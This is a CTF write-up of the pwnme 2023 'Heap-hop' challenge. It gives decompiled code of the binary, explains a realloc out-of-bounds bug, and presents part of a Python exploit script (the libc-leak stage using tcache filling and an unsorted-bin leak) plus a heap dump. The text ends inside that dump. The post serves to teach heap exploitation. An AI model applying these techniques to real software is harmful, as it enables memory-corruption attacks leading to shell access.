<!doctype html>
<html lang="en-us">
  <head>
    <title>[pwnme 2023 - pwn] Heap-hop // ret2school</title>
    <link rel="shortcut icon" href="/favicon.ico" />
    <meta charset="utf-8" />
    <meta name="generator" content="Hugo 0.92.2" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="author" content="nasm" />
    <meta name="description" content="" />
    <link rel="stylesheet" href="https://ret2school.github.io/css/main.min.0fb49e70a30412f97ddfc418e18fefef1d9fcdebe45f634dbbba768b00fe1eec.css" />

    
    <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="[pwnme 2023 - pwn] Heap-hop"/>
<meta name="twitter:description" content="Heap-Hop  Solves: 31 Medium
Heap exploitation is cool, and the best is when no free is used. &gt;Try to pwn the challenge and get the flag remotely.
Note:
 You must spawn an instance to solve this challenge. You can connect to it with netcat: nc IP PORT  Author: Express#8049
Remote service at : nc 51.254.39.184 1336
 Heap-hop is a heap exploitation challenge I did during the pwnme CTF."/>

    <meta property="og:title" content="[pwnme 2023 - pwn] Heap-hop" />
<meta property="og:description" content="Heap-Hop  Solves: 31 Medium
Heap exploitation is cool, and the best is when no free is used. &gt;Try to pwn the challenge and get the flag remotely.
Note:
 You must spawn an instance to solve this challenge. You can connect to it with netcat: nc IP PORT  Author: Express#8049
Remote service at : nc 51.254.39.184 1336
 Heap-hop is a heap exploitation challenge I did during the pwnme CTF." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://ret2school.github.io/post/heaphop/" /><meta property="article:section" content="post" />
<meta property="article:published_time" content="2023-05-07T00:00:00+00:00" />
<meta property="article:modified_time" content="2023-05-07T00:00:00+00:00" />



  </head>
  <body>
    <header class="app-header">
      <a href="https://ret2school.github.io"><img class="app-header-avatar" src="/pic.jpeg" alt="nasm" /></a>
      <span class="app-header-title">ret2school</span>
      <nav class="app-header-menu">
          <a class="app-header-menu-item" href="/post/list_team/">About</a>
             - 
          
          <a class="app-header-menu-item" href="/">Home</a>
             - 
          
          <a class="app-header-menu-item" href="/tags/">Tags</a>
      </nav>
      <p>Just a bunch of french ctf players</p>
    </header>
    <main class="app-container">
      
  <article class="post">
    <header class="post-header">
      <h1 class ="post-title">[pwnme 2023 - pwn] Heap-hop</h1>
      <div class="post-meta">
        <div>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
  <title>calendar</title>
  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
</svg>
          May 7, 2023
        </div>
        <div>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
  <title>clock</title>
  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
</svg>
          12 min read
        </div>
        <div>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
  <title>tag</title>
  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
</svg>
              <a class="tag" href="https://ret2school.github.io/tags/ctf/">ctf</a>
              <a class="tag" href="https://ret2school.github.io/tags/nasm/">nasm</a>
              <a class="tag" href="https://ret2school.github.io/tags/pwn/">pwn</a>
              <a class="tag" href="https://ret2school.github.io/tags/linux/">linux</a>
              <a class="tag" href="https://ret2school.github.io/tags/pwnme/">pwnme</a>
              <a class="tag" href="https://ret2school.github.io/tags/heap/">heap</a>
              <a class="tag" href="https://ret2school.github.io/tags/tcache/">tcache</a>
        </div>
      </div>
    </header>
    <div class="post-content">
      <h2 id="heap-hop">Heap-Hop</h2>
<blockquote>
<p>Solves: 31  Medium</p>
<p>Heap exploitation is cool, and the best is when no free is used. &gt;Try to pwn the challenge and get the flag remotely.</p>
<p><strong>Note</strong>:</p>
<ul>
<li><em>You must spawn an instance to solve this challenge. You can connect to it with netcat: nc IP PORT</em></li>
</ul>
<p>Author: Express#8049</p>
<p>Remote service at : nc 51.254.39.184 1336</p>
</blockquote>
<p>Heap-hop is a heap exploitation challenge I did during the <a href="https://pwnme.fr/">pwnme CTF</a>. It involved classic tricks like tcache poisoning and GOT hiijacking. You can find the related files <a href="https://github.com/ret2school/ctf/tree/master/2023/pwnme/pwn/heap">here</a>.</p>
<h3 id="tldr">TL;DR</h3>
<ul>
<li>Setup heap layout</li>
<li>fill tcachebin for 0x400 sized chunks</li>
<li>free large 0x400 sized chunk to get libc addresses</li>
<li>oob read onto the chunk right before the large freed chunk =&gt; libc leak</li>
<li>request a small 0x20 sized chunk that gets free right after, it falls at the begin of the chunk in the unsortedbin, oob read like just before =&gt; heap leak.</li>
<li>tcache poisoning (we&rsquo;re able to deal with safe-linking given we leaked heap)</li>
<li>With the help of tcache poisoning, overwrite <code>realloc@got</code> to write <code>&amp;system</code></li>
<li><code>realloc(&quot;/bin/sh&quot;)</code> is then <code>system(&quot;/binb/sh&quot;)</code></li>
</ul>
<h2 id="what-we-have">What we have</h2>
<pre tabindex="0"><code>$ checksec --file ./heap-hop
[*] '/media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ret2school/ctf/2023/pwnme/pwn/heap/heap-hop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
    RUNPATH:  b'/home/nasm/Documents/pwn/pwnme/heap'
$ ./libc.so.6 
GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.1) stable release version 2.35.
Copyright (C) 2022 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 11.2.0.
libc ABIs: UNIQUE IFUNC ABSOLUTE
For bug reporting instructions, please see:
&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.
</code></pre><p>What we can see is that a recent libc is provided (which means with safe-linking) and that the binary isn&rsquo;t PIE.</p>
<h2 id="code-review">Code review</h2>
<p>Here is basically the main logic of the binary:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#8be9fd">int</span> <span style="color:#ff79c6">__cdecl</span> <span style="color:#50fa7b">main</span>(<span style="color:#8be9fd">int</span> argc, <span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">**</span>argv, <span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">**</span>envp)
{
  <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> input_int; <span style="color:#6272a4">// [rsp+Ch] [rbp-4h]
</span><span style="color:#6272a4"></span>
  puts(<span style="color:#f1fa8c">&#34;[+] Welcome to hip-hop, you can create and listen to heap-hop music&#34;</span>);
  <span style="color:#ff79c6">do</span>
  {
    printf(<span style="color:#f1fa8c">&#34;%s&#34;</span>, <span style="color:#f1fa8c">&#34;Make your choice :</span><span style="color:#f1fa8c">\n\t</span><span style="color:#f1fa8c">- 1. Create a track.</span><span style="color:#f1fa8c">\n\t</span><span style="color:#f1fa8c">- 2. Read a track.</span><span style="color:#f1fa8c">\n\t</span><span style="color:#f1fa8c">- 3. Edit a track.</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&gt; &#34;</span>);
    input_int <span style="color:#ff79c6">=</span> read_input_int();
    <span style="color:#ff79c6">if</span> ( input_int <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">3</span> )
    {
      handle_edit();
    }
    <span style="color:#ff79c6">else</span>
    {
      <span style="color:#ff79c6">if</span> ( input_int <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">3</span> )
        <span style="color:#ff79c6">goto</span> LABEL_10;
      <span style="color:#ff79c6">if</span> ( input_int <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">1</span> )
      {
        handle_create();
        <span style="color:#ff79c6">continue</span>;
      }
      <span style="color:#ff79c6">if</span> ( input_int <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">2</span> )
        handle_read();
      <span style="color:#ff79c6">else</span>
<span style="color:#8be9fd;font-style:italic">LABEL_10</span>:
        quit <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span>;
    }
  }
  <span style="color:#ff79c6">while</span> ( quit <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">1</span> );
  <span style="color:#ff79c6">return</span> puts(<span style="color:#f1fa8c">&#34;[?] Goodbye.&#34;</span>);
}
</code></pre></div><p>Basic layout for a heap exploitation challenge, we&rsquo;re allowed to create, read and edit a given track. As we already read in the initial statement we apparently cannot free a track.</p>
<p>Let&rsquo;s first take a look at the create function:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int64</span> <span style="color:#50fa7b">handle_create</span>()
{
  <span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>v0; <span style="color:#6272a4">// rdx
</span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> idx; <span style="color:#6272a4">// [rsp+Ch] [rbp-14h] BYREF
</span><span style="color:#6272a4"></span>  chunk_t <span style="color:#ff79c6">*</span>buf; <span style="color:#6272a4">// [rsp+10h] [rbp-10h]
</span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int64</span> v4; <span style="color:#6272a4">// [rsp+18h] [rbp-8h]
</span><span style="color:#6272a4"></span>
  v4 <span style="color:#ff79c6">=</span> __readfsqword(<span style="color:#bd93f9">0x28u</span>);
  idx <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
  printf(<span style="color:#f1fa8c">&#34;Enter the tracklist ID</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&gt; &#34;</span>);
  __isoc99_scanf(<span style="color:#f1fa8c">&#34;%d&#34;</span>, <span style="color:#ff79c6">&amp;</span>idx);
  <span style="color:#ff79c6">if</span> ( idx <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">0x100</span> )
    _exit(<span style="color:#bd93f9">1</span>);
  <span style="color:#ff79c6">if</span> ( tracks[idx] )
  {
    puts(<span style="color:#f1fa8c">&#34;[!] track already exists.</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
  }
  <span style="color:#ff79c6">else</span>
  {
    buf <span style="color:#ff79c6">=</span> (chunk_t <span style="color:#ff79c6">*</span>)malloc(<span style="color:#bd93f9">0x30uLL</span>);
    <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>buf )
      _exit(<span style="color:#bd93f9">1</span>);
    printf(<span style="color:#f1fa8c">&#34;Enter the tracklist name</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&gt; &#34;</span>);
    read(<span style="color:#bd93f9">0</span>, buf, <span style="color:#bd93f9">0x20uLL</span>);
    printf(<span style="color:#f1fa8c">&#34;Enter the tracklist content length</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&gt; &#34;</span>);
    __isoc99_scanf(<span style="color:#f1fa8c">&#34;%ld&#34;</span>, <span style="color:#ff79c6">&amp;</span>buf<span style="color:#ff79c6">-&gt;</span>size);
    <span style="color:#ff79c6">if</span> ( buf<span style="color:#ff79c6">-&gt;</span>size <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">0x480uLL</span> )
      _exit(<span style="color:#bd93f9">1</span>);
    v0 <span style="color:#ff79c6">=</span> malloc(buf<span style="color:#ff79c6">-&gt;</span>size);
    buf<span style="color:#ff79c6">-&gt;</span>track <span style="color:#ff79c6">=</span> (<span style="color:#ff79c6">__int64</span>)v0;
    <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>buf<span style="color:#ff79c6">-&gt;</span>track )
      _exit(<span style="color:#bd93f9">1</span>);
    printf(<span style="color:#f1fa8c">&#34;Enter the tracklist content</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&gt; &#34;</span>);
    <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>read(<span style="color:#bd93f9">0</span>, (<span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>)buf<span style="color:#ff79c6">-&gt;</span>track, buf<span style="color:#ff79c6">-&gt;</span>size) )
      _exit(<span style="color:#bd93f9">1</span>);
    tracks[idx] <span style="color:#ff79c6">=</span> buf;
    puts(<span style="color:#f1fa8c">&#34;[+] track successfully created.</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
  }
  <span style="color:#ff79c6">return</span> v4 <span style="color:#ff79c6">-</span> __readfsqword(<span style="color:#bd93f9">0x28u</span>);
}
</code></pre></div><p>It crafts a chunk, and then allocates a chunk for a given size (&lt; 0x480). The read function is very basic:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int64</span> <span style="color:#50fa7b">handle_read</span>()
{
  <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> v1; <span style="color:#6272a4">// [rsp+4h] [rbp-Ch] BYREF
</span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int64</span> v2; <span style="color:#6272a4">// [rsp+8h] [rbp-8h]
</span><span style="color:#6272a4"></span>
  v2 <span style="color:#ff79c6">=</span> __readfsqword(<span style="color:#bd93f9">0x28u</span>);
  v1 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
  printf(<span style="color:#f1fa8c">&#34;Enter the tracklist ID</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&gt; &#34;</span>);
  __isoc99_scanf(<span style="color:#f1fa8c">&#34;%d&#34;</span>, <span style="color:#ff79c6">&amp;</span>v1);
  <span style="color:#ff79c6">if</span> ( v1 <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">0x100</span> )
    _exit(<span style="color:#bd93f9">1</span>);
  <span style="color:#ff79c6">if</span> ( tracks[v1] )
  {
    puts(<span style="color:#f1fa8c">&#34;[+] track content :&#34;</span>);
    write(<span style="color:#bd93f9">1</span>, (<span style="color:#ff79c6">const</span> <span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>)tracks[v1]<span style="color:#ff79c6">-&gt;</span>track, tracks[v1]<span style="color:#ff79c6">-&gt;</span>size);
    puts(<span style="color:#ff79c6">&amp;</span>byte_4020FF);
  }
  <span style="color:#ff79c6">else</span>
  {
    puts(<span style="color:#f1fa8c">&#34;[!] track doesn&#39;t exist.</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
  }
  <span style="color:#ff79c6">return</span> v2 <span style="color:#ff79c6">-</span> __readfsqword(<span style="color:#bd93f9">0x28u</span>);
}
</code></pre></div><p>It prints <code>tracks[v1]-&gt;size</code> bytes from <code>tracks[v1]-&gt;track</code>. Which means no need to worry about badchars for the leak.</p>
<p>The bug lies in the <code>handle_edit</code> function:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int64</span> <span style="color:#50fa7b">handle_edit</span>()
{
  chunk_t <span style="color:#ff79c6">*</span>v0; <span style="color:#6272a4">// rbx
</span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> idx; <span style="color:#6272a4">// [rsp+Ch] [rbp-24h] BYREF
</span><span style="color:#6272a4"></span>  size_t size; <span style="color:#6272a4">// [rsp+10h] [rbp-20h] BYREF
</span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int64</span> v4; <span style="color:#6272a4">// [rsp+18h] [rbp-18h]
</span><span style="color:#6272a4"></span>
  v4 <span style="color:#ff79c6">=</span> __readfsqword(<span style="color:#bd93f9">0x28u</span>);
  idx <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
  size <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0LL</span>;
  printf(<span style="color:#f1fa8c">&#34;Enter the tracklist ID</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&gt; &#34;</span>);
  __isoc99_scanf(<span style="color:#f1fa8c">&#34;%d&#34;</span>, <span style="color:#ff79c6">&amp;</span>idx);
  <span style="color:#ff79c6">if</span> ( idx <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">0x100</span> )
    _exit(<span style="color:#bd93f9">1</span>);
  <span style="color:#ff79c6">if</span> ( tracks[idx] )
  {
    printf(<span style="color:#f1fa8c">&#34;Enter the new tracklist content length</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&gt; &#34;</span>);
    __isoc99_scanf(<span style="color:#f1fa8c">&#34;%ld&#34;</span>, <span style="color:#ff79c6">&amp;</span>size);
    <span style="color:#ff79c6">if</span> ( size <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">0x480</span> )
      _exit(<span style="color:#bd93f9">1</span>);
    v0 <span style="color:#ff79c6">=</span> tracks[idx];
    v0<span style="color:#ff79c6">-&gt;</span>track <span style="color:#ff79c6">=</span> (<span style="color:#ff79c6">__int64</span>)realloc((<span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>)v0<span style="color:#ff79c6">-&gt;</span>track, size);
    printf(<span style="color:#f1fa8c">&#34;Enter the new tracklist content</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&gt; &#34;</span>);
    read(<span style="color:#bd93f9">0</span>, (<span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>)tracks[idx]<span style="color:#ff79c6">-&gt;</span>track, tracks[idx]<span style="color:#ff79c6">-&gt;</span>size);
    puts(<span style="color:#f1fa8c">&#34;[+] track content edited.&#34;</span>);
  }
  <span style="color:#ff79c6">else</span>
  {
    puts(<span style="color:#f1fa8c">&#34;[!] track doesn&#39;t exist.</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
  }
  <span style="color:#ff79c6">return</span> v4 <span style="color:#ff79c6">-</span> __readfsqword(<span style="color:#bd93f9">0x28u</span>);
}
</code></pre></div><p>There are two bugs, or at least interesting behaviours around realloc. First there is an out of bound (oob) read / write, indeed if we give a size smaller than <code>tracks[idx]-&gt;size</code>, then <code>v0-&gt;track</code> could be changed to a smaller chunk and thus <code>read(0, (void *)tracks[idx]-&gt;track, tracks[idx]-&gt;size);</code> could write over the end of the chunk. Secondly we can free a chunk by giving zero to the size.</p>
<h2 id="exploitation">Exploitation</h2>
<p>Given tcache poisoning seems to be pretty easy to achieve, we need to find were use our arbitrary write. If you remind well, the binary isn&rsquo;t PIE and has only partial RELRO, which means we could easily hiijack the GOT entry of a function (like realloc) to replace it with system and then call <code>realloc(&quot;/bin/sh&quot;)</code>. This way we need to get a heap and a libc leak.</p>
<h3 id="libc-leak">libc leak</h3>
<p>To get a libc leak we can fill the tcache and free a large chunk to make appear libc addresses on the heap and then read it through the oob read. Which gives:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">create(<span style="color:#bd93f9">0</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span>, <span style="color:#bd93f9">5</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;0&#34;</span>)

<span style="color:#6272a4"># Step one, 7 chunks to fill tcache later</span>
<span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">7</span>):
    create(<span style="color:#bd93f9">1</span><span style="color:#ff79c6">+</span>i, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span>, <span style="color:#bd93f9">0x400</span>, <span style="color:#8be9fd;font-style:italic">str</span>(i)<span style="color:#ff79c6">.</span>encode())

<span style="color:#6272a4"># small chunk which will be used to the oob r/w</span>
create(<span style="color:#bd93f9">8</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">1</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span>, <span style="color:#bd93f9">0x20</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;_&#34;</span>)
<span style="color:#6272a4"># victim chunk</span>
create(<span style="color:#bd93f9">9</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">1</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span>, <span style="color:#bd93f9">0x400</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;_&#34;</span>)

<span style="color:#6272a4"># chunk with big size that will be used for the oob r/w</span>
create(<span style="color:#bd93f9">10</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">1</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span>, <span style="color:#bd93f9">0x200</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;barreer&#34;</span>)
create(<span style="color:#bd93f9">10</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">2</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span>, <span style="color:#bd93f9">0x20</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;barree2&#34;</span>)

<span style="color:#6272a4"># fill tcache</span>
<span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">7</span>):
    free(<span style="color:#bd93f9">1</span><span style="color:#ff79c6">+</span>i)

<span style="color:#6272a4"># oob chunk </span>
free(<span style="color:#bd93f9">8</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">1</span>)

free(<span style="color:#bd93f9">11</span>) <span style="color:#6272a4"># we free in order that at the next edit it actually allocates a new chunk</span>
edit(<span style="color:#bd93f9">11</span>, <span style="color:#bd93f9">0x20</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;_&#34;</span>) <span style="color:#6272a4"># allocated in 9</span>

free(<span style="color:#bd93f9">9</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">1</span>) <span style="color:#6272a4"># falls in the unsortedbin</span>

read(<span style="color:#bd93f9">11</span>) <span style="color:#6272a4"># oob read</span>
io<span style="color:#ff79c6">.</span>recv(<span style="color:#bd93f9">0x70</span>)
libc<span style="color:#ff79c6">.</span>address <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>unpack(io<span style="color:#ff79c6">.</span>recv(<span style="color:#bd93f9">8</span>)) <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x219ce0</span>
</code></pre></div><p>The heap looks like this:</p>
<pre tabindex="0"><code>0x1d83120       0x0000000000000000      0x0000000000000041      ........A.......        &lt;= chunk used to get the oob r/w
0x1d83130       0x000000000000000a      0x0000000000000000      ................                                                                               
0x1d83140       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83150       0x0000000000000020      0x0000000000000000       ...............
0x1d83160       0x0000000000000000      0x0000000000000031      ........1.......        &lt;= track buffer of the chunk used to get the oob r/w
0x1d83170       0x0000000000000a5f      0x0000000000000000      _...............                                                                               
0x1d83180       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83190       0x0000000000000000      0x0000000000000041      ........A.......        &lt;= victim chunk, size: 0x400, its track field is fell into the unsortedbin
0x1d831a0       0x000000000000000a      0x0000000000000000      ................                                                                               
0x1d831b0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d831c0       0x0000000000000400      0x0000000000000000      ................                                                                               
0x1d831d0       0x0000000000000000      0x0000000000000411      ................        &lt;-- unsortedbin[all][0]                                                
0x1d831e0       0x00007f0eb218dce0      0x00007f0eb218dce0      ................                                                                               
0x1d831f0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83200       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83210       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83220       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83230       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83240       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83250       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83260       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83270       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83280       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83290       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d832a0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d832b0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d832c0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d832d0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d832e0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d832f0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83300       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83310       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83320       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83330       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83340       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83350       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83360       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83370       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83380       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83390       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d833a0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d833b0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d833c0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d833d0       0x0000000000000000      0x0000000000000000      ................
0x1d833e0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d833f0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83400       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83410       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83420       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83430       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83440       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83450       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83460       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83470       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83480       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83490       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d834a0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d834b0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d834c0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d834d0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d834e0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d834f0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83500       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83510       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83520       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83530       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83540       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83550       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83560       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83570       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83580       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83590       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d835a0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d835b0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d835c0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d835d0       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d835e0       0x0000000000000410      0x0000000000000040      ........@.......        &lt;= Freed chunk 11
0x1d835f0       0x000000000000000a      0x0000000000000000      ................                                                                               
0x1d83600       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83610       0x0000000000000200      0x0000000001d83170      ........p1......                                                                               
0x1d83620       0x0000000000000000      0x0000000000000211      ................                                                                               
0x1d83630       0x0000000000001d83      0x5b5e1382ca86a7f8      ..............^[        &lt;-- tcachebins[0x210][0/1]                                             
0x1d83640       0x0000000000000000      0x0000000000000000      ................                                                                               
0x1d83650       0x0000000000000000      0x0000000000000000      ................                             
0x1d83660       0x0000000000000000      0x0000000000000000      ................                             
0x1d83670       0x0000000000000000      0x0000000000000000      ................                             
0x1d83680       0x0000000000000000      0x0000000000000000      ................                             
